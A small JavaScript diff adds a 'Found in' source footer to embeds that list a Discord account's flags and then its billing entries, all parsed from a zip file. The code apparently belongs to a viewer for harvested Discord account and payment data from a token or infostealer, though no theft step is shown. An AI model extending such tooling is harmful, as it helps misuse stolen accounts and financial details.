@@ -61,6 +61,9 @@ const json = async (zipFile) => {
         ['🚩 Flags', accountFlags(account.flags) !== '' ? accountFlags(account.flags) : 'None'],
       ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
       color: account.accent_color,
+      footer: {
+        text: `Found in ${account.source.replace(account.source[0], account.source[0].toUpperCase())}`
+      }
     });
   }
   discordAccountInfo.billing?.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
